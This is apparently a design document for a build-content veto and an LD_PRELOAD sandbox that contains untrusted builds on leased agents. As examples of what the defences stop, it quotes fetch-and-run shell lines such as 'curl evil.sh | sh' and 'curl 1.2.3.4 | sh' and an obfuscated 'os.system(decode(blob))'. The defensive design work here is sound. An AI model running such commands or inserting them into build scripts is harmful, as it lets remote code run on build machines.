# Veto alternates — how `maybe_veto_build` decides

Status: **design** (one tiny tier-A veto is implemented in `tools/aeb-agent`;
the rest is design). Companion to
[`run-policy-class-and-cloud-leverage.md`](run-policy-class-and-cloud-leverage.md)
(the sovereign-agent + policy-class design). This doc is specifically about
*how* a remote `aeb-agent` decides, on its own authority, whether to build a
prepared tree — `maybe_veto_build` — and, since the veto is only the *policy*
layer, how Aether's runtime sandbox **contains** the build it lets through
(the section "Veto is policy; containment is enforcement").

(Disambiguation: the policy-class doc also says "veto", but that's the
*token/claim* veto — refusing an unauthenticated or over-scoped dispatch at
the door. This doc is the *build-content* veto — having authenticated and
prepared the tree, does the agent's policy permit *this build* to run. Two
different gates: auth-veto at the door, build-veto after prepare.)

## SCOPE — read this first, it's the whole point

These vetoes guard against **build-grammar escapes**: things the
`.build.ae` / `.tests.ae` *orchestration* does that the agent operator
doesn't want a leased node to do — shell out to something dangerous, reach
the network, pull a banned/known-vulnerable dependency, write outside the
workdir, embed a secret in the tree, dispatch onward.

They do **NOT** guard against **the application being built being a trojan.**
Nothing here inspects, or can vouch for, the runtime behaviour of the
*compiled artifact*. A `.build.ae` that cleanly runs `javac` on Java source
passes every veto in this doc — and that Java can still be malware. The
veto sees *the build's intent*, not *the program's intent*.

Stated bluntly so no one mistakes it:

> **In scope:** "this *build* would `curl evil.sh | sh`, or link a CVE'd
> dependency, or write to `/etc`." → vetoable here.
>
> **Out of scope:** "the binary this build produces exfiltrates data when
> run." → NOT addressed here. That needs artifact scanning / SBOM /
> sandboxed *execution* of the output, which is a different problem with
> different (and weaker) guarantees.

Conflating the two is how a veto framework manufactures false confidence.
A green `maybe_veto_build` means *the build process was acceptable to the
agent operator* — it says nothing about whether the software is safe to
run. Keep that line bright.

## Veto is policy; containment is enforcement — they are different layers

Before the tiers: be clear about what the veto *is*. `maybe_veto_build` is a
**policy gate** — it inspects (the tree, the resolved closure, a recorded
trace) and *decides* whether to proceed. Every tier in this doc is a thing
the agent *reads and reasons about* before letting the build run.

That makes the veto fundamentally **bounded by what it can read.** Tier C's
honest-limits section already says it: a `.build.ae` doing
`os.system(decode(blob))` records `os.system(<computed string>)` — the veto
can flag opacity as policy, but it *cannot read what would actually run.* A
build that *computes* `curl evil.sh | sh` at runtime is invisible to every
tier here. That is not a gap to be closed by a smarter veto; it is the
nature of a read-and-decide gate.

The thing that *does* close it is **containment** — enforcing limits on the
running build at a layer it cannot reason its way around. aeb's leased agent
has **three containment surfaces**, stacked as defense in depth, each
catching what the layer above is blind to:

| Layer | Mechanism | Catches | Blind to |
|---|---|---|---|
| **Veto** (policy; in-process, pre-build) | `maybe_veto_build` tiers A/B/C | *Declared / readable* build-grammar escapes | Computed/opaque escapes; the compiled artifact |
| **Aether sandbox** (per-process; `LD_PRELOAD`) | `spawn_sandboxed(grants, "aeb", target)` | *Runtime* fs/exec/tcp/env attempts by the build **and its children** — including computed ones the veto couldn't read | A statically-linked tool that bypasses libc; the artifact's later behaviour |
| **Container / OS** (kernel namespaces, caps, netns) | `itests/agent-container` hardening | Everything that escapes the preload — kernel-level blast radius | (this is the floor) |

The middle layer is the one this section exists to capture, because it is
**already implemented upstream in Aether and aeb has not yet consumed it**
(LLM.md's scope table lists "Sandboxing / isolation" as a TODO — "Aether's
runtime sandbox is per-process, not per-build-step." The finding below is
that per-process is *enough*, because the build's children inherit it).

### The Aether sandbox primitive — `spawn_sandboxed` + the grandchild finding

Aether ships a runtime containment sandbox (`runtime/aether_sandbox.c`,
`runtime/aether_spawn_sandboxed.c`, `runtime/libaether_sandbox_preload.c`;
demos in the Aether tree at `examples/sandbox-demo.ae` /
`examples/sandbox-spawn.ae`). Two shapes:

- **In-process** — `run_sandboxed(perms) |ctx| { ... }` installs a permission
  checker for the current process; stdlib `fs`/`os`/`net` calls consult it
  transparently (the contained code uses *normal* stdlib and "should not know
  for sure it is contained" — a denied read is indistinguishable from
  file-not-found).
- **Cross-process** — `spawn_sandboxed(grants, program, arg) -> exit_code`
  forks, serialises the grant list into POSIX shared memory, sets
  `LD_PRELOAD=libaether_sandbox.so` + `AETHER_SANDBOX_SHM=<name>` in the
  child's env, and `execlp`s. The preload intercepts libc `open` / `fopen` /
  `connect` / `execve` / `getenv` (and `mmap`/`mprotect`/`dlopen`) and checks
  each against the grants before calling through.

Grants are `(category, pattern)` pairs with glob/prefix matching:
`fs_read`, `fs_write`, `exec`, `tcp`, `tcp_listen`, `env` (and `*`/`*` for
grant-all). E.g. `grant_fs_read("/etc/*")`, `grant_fs_write("/tmp/worker/*")`,
`grant_exec("echo *")`, `grant_tcp("api.example.com")`.

**The finding that makes this useful for the agent:** because
`spawn_sandboxed` sets `LD_PRELOAD` and `AETHER_SANDBOX_SHM` as **environment
variables** in the child before `execlp`, and the `execve` interceptor
re-checks every subsequent exec against the same shared-memory grants, the
sandbox **propagates to the entire process subtree.** If the agent spawns
`aeb` sandboxed, then `aeb → gcc → cc1`, `aeb → javac`, etc. all run under
the *same* grant list, each `connect()`/`open()`/`execve()` checked. So
"per-process, not per-build-step" understates it: **one `spawn_sandboxed` of
`aeb <target>` contains the whole build subtree.** That is precisely the
per-build-step isolation the roadmap wanted, available today.

This is also why the sandbox covers the veto's blind spot. A build that
*computes* `curl 1.2.3.4 | sh` defeats tier C's trace (the command is opaque)
— but the `connect(1.2.3.4)` is a real syscall, and the preload's `connect`
interceptor denies it regardless of how the command string was built. **Policy
can be fooled by opacity; the LD_PRELOAD interceptor sees the actual
syscall.** The veto and the sandbox are not redundant — the sandbox is what
makes "a clean veto is not a clean program" survivable.

### How the agent would wire it (design — not implemented)

In `tools/aeb-agent.ae`, the accepted-build path today is:

```
cmd = "cd '${workdir}' && aeb '${target}'"
rc = os.system(cmd)
```

The sandboxed shape replaces the `os.system` with a `spawn_sandboxed` whose
grant list is **the agent operator's policy** (the same authority that owns
the veto rules — see the policy-class doc), derived from flags/config:

```
grants = sandbox("preint-build") {
    grant_fs_read(repo)             // read the prepared tree
    grant_fs_read("/usr/*")         // toolchain + libs
    grant_fs_read("/lib/*")
    grant_fs_write(target_dir)      // write only build outputs
    grant_fs_write("/tmp/*")        // compilers stage here
    grant_exec("/usr/bin/*")        // the compiler allowlist (see constraints)
    // NO grant_tcp — see "network stance" below
}
rc = spawn_sandboxed(grants, "aeb", target)
```

### Constraints — state them or the layer will be over-trusted

1. **Linux-only.** `spawn_sandboxed` is `fork`/`shm_open`/`LD_PRELOAD`; on
   non-Linux it returns `-1` with a clear message. The agent container is
   Debian, so this is fine *there* — but a macOS/BSD agent host gets no
   cross-process sandbox and must fall back to the container/VM layer.
2. **`exec` grants are by resolved path.** The interceptor checks the
   `execve` pathname against `exec` grants (prefix/glob). So the grant list
   must enumerate the toolchain — `grant_exec("/usr/bin/*")` or a tighter
   per-compiler allowlist. **Enumerating the toolchain correctly is the
   work**; too broad and it's no fence, too narrow and legitimate builds
   break. This enumeration *is* the policy.
3. **libc-level, not kernel-level.** A statically-linked binary, or one that
   issues raw syscalls bypassing libc, is **not** caught by the preload —
   that is what the container/namespace layer (below it) is for. The sandbox
   raises the cost of an escape; it is not a kernel jail.
4. **Not a substitute for the container.** It is the *middle* layer. A build
   the preload contains can still exhaust memory, fork-bomb, or fill the
   disk — `pids`/`memory`/`cpu` cgroup limits and a read-only rootfs live at
   the container layer, which is a separate hardening pass.

### Network stance for a leased `preint` build

**Default: no `tcp` grant at all.** A `preint` build leased to the agent
should get *zero network*. The common case justifies it: the agent owns the
origin and fetches the base tree itself (`_prepare_tree`'s
`git fetch origin` + `git checkout`), so the sources are already on disk
before the build runs; a compile-only build needs no socket. With no `tcp`
grant, the preload denies *every* `connect()` — which is exactly what closes
the computed-`curl|sh` hole at the syscall, no matter how the command was
constructed.

A build that *legitimately* needs the network (resolving Maven/npm/cargo
coordinates at build time rather than from a pre-populated cache, or reaching
an internal artifact mirror) is then the **explicit exception**: the operator
adds a `grant_tcp(<host-or-ip>)` allowlist for that dispatch. The allowlist
is itself attack surface, so the strong stance keeps it empty by default and
makes every entry a deliberate operator decision. (If/when this is tied to
the dispatch's policy class — `preint`=no-net, `ci`=allowlist — that is the
plumbing described in the policy-class doc; not designed here beyond the
default.)

## The veto pipeline: three complementary tiers

`maybe_veto_build(repo, target, purpose)` runs an ordered list of checks;
any one may refuse. They differ by *what they inspect* and *what they cost*.

### Tier A — tree scan (cheap, pre-everything)

Grep/inspect the prepared tree (post-checkout, post-patch) for obvious
red flags before any compile: committed secrets/private keys, banned
files, oversize trees, files outside an allowed set. Implemented today as
a single conservative example (a `BEGIN RSA PRIVATE KEY` marker scan) — the
placeholder seam. Fast, dumb, catches the blatant. A hit on the *patch*
specifically is the highest-signal case (the untrusted pre-integration
delta introduced it).

### Tier B — resolved-coordinate / SBOM meta (the dependency-CVE tier)

Inspect the **resolved third-party closure** — the exact
`group:artifact:version` set aeb already computes (`aeb-resolve.jar` /
pnpm / cargo / NuGet) plus the `build.dep(...)` edge graph aeb extracts
statically (`tools/extract-deps`, `target/_aeb/_edges.txt`). A veto here
asks "does this build pull a known-vulnerable or banned dependency?" —
against structured coordinates, NOT a regex over `pom.xml`. This is where
OWASP-style dependency checks live. aeb *already produces* most of the
input; it needs a resolve-only / meta-emit mode so the veto can read the
closure without doing a full build. (See the "structured outputs" item in
TODO.md § Test result reporting for the adjacent plumbing.)

### Tier C — doppelganger-compile trace (the build-grammar-intent tier)

**The interesting one, and the one this doc exists to capture.** Compile
the target against a *doppelganger* `build` / `aether` / language SDK that,
instead of *executing* the build, **records what the build would do** — its
`os.system` calls, `dep()` edges, `link_flag`s, `extra_source`s, codegen,
any `std.net`/`std.http` reach. The veto then inspects that **structured
recorded intent** ("this build would `os.system('curl …')`", "would link
`libsketchy.so`", "would reach 1.2.3.4") rather than regexing source.

#### Why aeb can do this cheaply (the Action!/Interface-Builder trick)

This is the same move as Denison Bollay's Action! (1988): interpret the
*same source* into an *alternate context* — and Paul's tsyne WYSIWYG
designer, which interprets a `.ts` UI script into a doppelganger Tsyne API
that records widget metadata instead of drawing widgets
(`tsyne/designer`). Provenance:
- Action! — paulhammant.com 2013-03-28, "Interface Builder's Alternative
  Lisp timeline": *"saved in Lisp, and interpreted the same on load … into
  a context."*
- tsyne designer — `designer/README.md`: *"the designer interprets the
  to-be-designed .ts script into designer's own emulation of Tsyne's
  TypeScript API."*

The tsyne designer pays an **impedance cost** for the trick: it
`tsc`-transpiles the script then *regex-rewrites the transpiled output* to
swap `require("tsyne")` → `global.designer` (fragile — it depends on how
`tsc` happens to emit import aliases; see `designer/src/server.ts`
~1057–1098). **aeb pays no such cost.** Which SDK an `.ae` imports is
purely the `--lib` search path — so swapping in a doppelganger is just
`aetherc --lib <doppelganger-lib>`. Same source, different library, **zero
source/output rewriting.** aeb has, via `--lib`, the clean "interpret into
an alternate context" that the homoiconic Lisp case had natively and the
TypeScript case has to fake. The pieces already exist: multi-`--lib`
resolution (the `aeblabel`/`AEB_COMPILE_LIB` work) and the
`maybe_veto_build` seam to host the trace inspection.

#### What tier C is, precisely — and its honest limits

It is **dynamic abstract interpretation of the build orchestration.** It
faithfully traces *what the `.build.ae` declares/reaches on the path taken*.
It is **not** a soundness proof, and three limits must be stated or it will
be over-trusted:

1. **Orchestration only, never the app.** Tier C sees "the build runs
   `javac` on these files" — never what the *compiled Java* does. (This is
   the SCOPE boundary above, restated at the mechanism level. The whole
   doppelganger sees the build-grammar layer; the trojan-in-the-output is
   invisible to it by construction.)
2. **One path, not all paths.** A `.build.ae` with `if env(X) { sys(a) }
   else { sys(b) }` records the branch *this run* takes. You get *a* trace,
   not *every* trace — the standard dynamic-analysis limitation. Sound
   coverage would need symbolic/abstract walking, a much larger thing.
3. **Opaque computation defeats understanding (but not detection).** A
   `.build.ae` doing `os.system(decode(blob))` records
   `os.system(<computed string>)` — the veto can still flag "opaque/
   computed command → veto" as policy, but it cannot always *read* what
   would run. Treat opacity itself as a vetoable signal.

So tier C is a **strong veto input for build-grammar escapes**, not a
guarantee. "The build declared nothing I forbid, on the path it took" — a
real, useful statement, within its stated limits.

## How the tiers compose

```
maybe_veto_build(repo, target, purpose):
  A. tree scan            (raw tree; cheap; pre-compile)        — implemented (stub)
  B. resolved-dep / SBOM  (structured coordinates; needs resolve) — design
  C. doppelganger trace   (--lib swap; records build intent)      — design
  → first refusal wins → {status:"vetoed", reason}; no build runs
```

- Run cheap→expensive (A, then B, then C) so a blatant tier-A hit short-
  circuits before the costly resolve/doppelganger work.
- The veto **list is pluggable** — each tier is N rules; OWASP/CVE is a
  tier-B rule, "no network reach" / "no shell-out outside an allowlist" are
  tier-C rules, "no committed secret" is a tier-A rule. New rules slot in
  without reshaping `maybe_veto_build`.
- Veto rules are **the agent operator's policy**, not the requester's — and
  may be keyed by the dispatch's policy class (a `ci` dispatch stricter
  than a `preint` one), per the policy-class doc.
- A vetoed dispatch is **a refusal, not a build failure** — distinct
  status (`vetoed`, HTTP 422), so the originator can tell "your build was
  refused on policy" from "your build ran and failed."

## What to build, in order

1. **Tier A is in.** Generalize the single stub scan into a small rule list
   (secret patterns, banned files, size cap, patch-touches-disallowed-path).
2. **Tier C spike** — a doppelganger `lib/build` (and key language SDKs)
   whose builders record `os.system`/`dep`/`link_flag`/codegen calls
   instead of executing, run via `aetherc --lib <doppelganger>`; emit the
   trace as JSON; a veto reads it. This is the high-value, aeb-unique tier
   (the `--lib` trick) and the natural evolution of the meta-for-veto idea.
3. **Tier B** — a `--resolve-only` / meta-emit mode so the resolved
   coordinate closure is available to a CVE/banned-dep veto without a full
   build; wire an OWASP-style check as the first tier-B rule.

## The one-line summary

`maybe_veto_build` guards the **build's behaviour**, tier C does it with the
Action!/designer "interpret into a doppelganger via `--lib`" trick (cheap
in aeb because `--lib` swaps the library with no impedance) — but it guards
**build-grammar escapes, never the application being built.** A clean veto
is not a clean program. Keep that boundary bright.

And remember the veto is only the *policy* layer: it decides on what it can
read. The thing that survives a build it *can't* read — a computed escape, an
opaque command — is **containment**, and Aether's `spawn_sandboxed` is the
already-shipped middle layer that contains the whole `aeb <target>` subtree
at the libc boundary, with the container/namespace layer below it. Veto +
sandbox + container, stacked — not the veto alone.
